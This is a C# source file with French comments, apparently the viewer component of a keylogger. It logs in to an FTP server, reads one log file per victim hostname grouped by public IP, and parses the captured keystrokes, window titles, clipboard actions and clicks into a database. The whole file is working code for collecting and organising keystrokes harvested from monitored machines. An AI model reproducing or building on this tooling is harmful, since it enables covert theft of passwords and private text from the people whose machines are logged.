using System;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Security.Policy;
using System.Text;
using System.Text.RegularExpressions;

namespace keyloggerviewer
{
    //Classe static regroupant les fonctions nécessaires à l'ajout des données à la base de donnée depuis le serveur ftp
    public static class DataAdd
    {
        public static string server = "";
        public static string username2 = "";
        public static string password = "";
        public static string ip = "";
        public static string port = "21";
        public static string folder = "";
        
        
        public static bool checkConnection(string serverIp, string serverPort, string userName, string pwd, string folder)
        //Fonction pour vérifier la connexion au serveur ftp et contrôler les données saisies par l'utilisateur.
        {
            string url = "ftp://" + serverIp + ":" + serverPort + "/" + folder;
            try
            {
                FtpWebRequest request = (FtpWebRequest)WebRequest.Create(url);
                request.Method = WebRequestMethods.Ftp.ListDirectory;
                request.Credentials = new NetworkCredential(userName, pwd);
                request.GetResponse();
            }
            catch(WebException ex)
            {
                //Si la requête génère une exception, c'est que la connexion est impossible.
                return false;
            }
            //Si la connexion est valide, on enregistre les valeurs de connexion.
            server = url;
            username2 = userName;
            password = pwd;
            ip = serverIp;
            port = serverPort;
            DataAdd.folder = folder;
            
            return true;
        }
        
        public static void loadData()
        //Fonction permettant de charger les données depuis le serveur ftp
        //Utilise les infos de connexion stockées par la fonction checkConnection (qui doit donc toujours être appelé avant).
        //Le serveur ftp est organisé de la façon suivante :
        //un dossier par adresse ip publique contenant chacun un fichier texte par nom d'hote qui contient les logs.
        {

            FtpWebRequest request;
		
            request = (FtpWebRequest)WebRequest.Create(server);
            request.Credentials = new NetworkCredential(username2, password);
            //On liste les dossier présent qui représente chacun une adresse ip
            request.Method = WebRequestMethods.Ftp.ListDirectory;
            FtpWebResponse response = (FtpWebResponse)request.GetResponse();

            Stream responseStream = response.GetResponseStream();
            StreamReader reader = new StreamReader(responseStream);
            string c = reader.ReadToEnd();
            string[] b = c.Split('\n');
            Console.WriteLine(b);
            reader.Close();
            response.Close();
            foreach (string ip in b)
            {
                //Pour chaque adresse ip, on liste les nom d'hote présent (les fichiers textes).
                string[] filename = getHostName(ip);
                foreach (string name in filename)
                {
                    //Normalement les addresses contiennent sont au format dossier/fichier.
                    if (name.Contains("/"))
                    {
                        Host h = getHostData(name);
                        Console.WriteLine(h.ToString());
                        //On insère ensuite l'hôte et les log dans la bd
                        Program.connection.insertLogData(h);
                    }
                }
                
            }
            
        }

        public static string[] getHostName(string folder)
        //Fonction permettant de lister les fichier présent dans un dossier sous forme d'array de string (chaque fichier correspond donc à un hote).
        {
            FtpWebRequest request;
            request = (FtpWebRequest)WebRequest.Create(server + folder);
            request.Credentials = new NetworkCredential(username2, password);
            request.Method = WebRequestMethods.Ftp.ListDirectory;
            FtpWebResponse response = (FtpWebResponse)request.GetResponse();

            Stream responseStream = response.GetResponseStream();
            StreamReader reader = new StreamReader(responseStream);
            string[] fileList = reader.ReadToEnd().Split('\n');
            return fileList;
        }

        public static Host getHostData(string address)
        {
            Console.WriteLine(address);
            //On sépare le nom de l'hôte de l'adresse ip
            string[] names = address.Split('/');
            string ip = names[0];
            string hostName = names[1].Split('.')[0];
            Host host = new Host(ip, hostName);
            //On récupère la date et l'heure du dernier log pour cet hote pour s'occuper que des log plus récent.  
            DateTime lastLog = Program.connection.getLastLogTime(host);
            Console.WriteLine(lastLog);
            FtpWebRequest request;
            request = (FtpWebRequest)WebRequest.Create(server + address);
            request.Credentials = new NetworkCredential(username2, password);
            request.Method = WebRequestMethods.Ftp.DownloadFile;
            FtpWebResponse response = (FtpWebResponse)request.GetResponse();

            Stream responseStream = response.GetResponseStream();
            StreamReader reader = new StreamReader(responseStream);
            //On lit l'integralité du fichier pour charger les logs.
            while (!reader.EndOfStream)
            {
                //Le format du ficher permet de récupérer la date et l'heure ainsi que la fenêtre ouverte du reste des données.
                string line = reader.ReadLine();
                string[] value = line.Split(new[] { "\\:\\" }, StringSplitOptions.None);
                Console.WriteLine("toto");
                Console.WriteLine(line);
                Console.WriteLine(value[0]);
                DateTime dateTime = DateTime.Parse(value[0]);
                // Si jamais le log est plus ancien que la dernière entrée dans la base de donnée, on ne le traite pas 
                if (dateTime > lastLog)
                {
                    // Sinon on récupère le nom de la fenêtre active et les données
                    string window = value[1];
                    string data = value[2];
                    // On parse ensuite les données pour obtenir le bon format : 
                    // Quand ce n'est pas simplement du texte (racourci; touche spéciale; ...) on encadre la touche par "`"
                    // Dans le texte `et \ seront toujours précédé par un \.
                    //Si le nombre de \ précédant un ` est pair, alors il est sépare bien du une action.
                    Regex r = new Regex("(\\\\\\\\)*`");
                    bool cmd = false;
                    int lastIndex = 0;
                    string logD = "";
                    foreach (Match b in r.Matches(data))
                    {
                        // On sépare les données selon les ` et on supprime les caractères d'echappement
                        logD = data.Substring(lastIndex, b.Index - lastIndex);
                        logD = logD.Replace("\\\\", "\\");
                        logD = logD.Replace("\\`", "`");
                        if (!cmd)
                        {
                            // Si on est pas dans une commande, on ajoute un log de type texte avec le contenu
                            if (logD != "")
                                host.addLog(new Log(dateTime, dateTime, "text", window, logD));
                        }
                        else
                        {
                            // En fonction du type de command, on rajoute le bon type de log.
                            if (logD == "Control+C")
                            {
                                host.addLog(new Log(dateTime, dateTime, "copy", window));
                            }
                            else if (logD == "Control+V")
                            {
                                host.addLog(new Log(dateTime, dateTime, "paste", window));
                            }
                            else if (logD == "Click")
                            {
                                host.addLog(new Log(dateTime, dateTime, "click", window));
                            }
                            else if (logD.Contains("+"))
                            {
                                host.addLog(new Log(dateTime, dateTime, "shortcut", window, logD));
                            }
                            else
                            {
                                host.addLog(new Log(dateTime, dateTime, "keypress", window, logD));
                            }
                        }

                        lastIndex = b.Index + 1;
                        cmd = !cmd;

                    }
                    // Entre le dernier ` et la fin des données, c'est forcement du texte.
                    logD = data.Substring(lastIndex, data.Length - lastIndex);
                    if (logD != "")
                        host.addLog(new Log(dateTime, dateTime, "text", window, logD));
                }
            }
            return host;
        }
    }
}